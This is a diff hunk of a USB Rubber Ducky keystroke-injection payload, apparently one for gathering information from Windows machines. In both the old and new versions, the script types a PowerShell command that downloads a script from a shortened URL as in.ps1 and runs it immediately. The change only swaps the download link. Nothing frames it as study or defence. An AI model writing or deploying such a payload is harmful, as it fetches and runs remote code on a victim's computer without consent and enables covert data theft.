@@ -32,8 +32,8 @@ ENTER
 DELAY 300
 
 
-REM 		-- https://gist.githubusercontent.com/MrSnowMonster/67b473f0395f6c08b7418680de668e1f/raw/80a29658ede19cfc692f384453fe63993fbe0141/just%2520for%2520my%2520own%2520testing.txt
-STRING (new-object net.webclient).DownloadFile('https://goo.gl/hGG54O','in.ps1')
+REM 		-- https://raw.githubusercontent.com/MrSnowMonster/MrSnows-SnowGlobe/master/RubberDucky/Payloads/Windows/info%20gather/ps1script
+STRING (new-object net.webclient).DownloadFile('https://goo.gl/rYvu2b','in.ps1')
 SHIFT ENTER
 STRING ./in.ps1
 ENTER
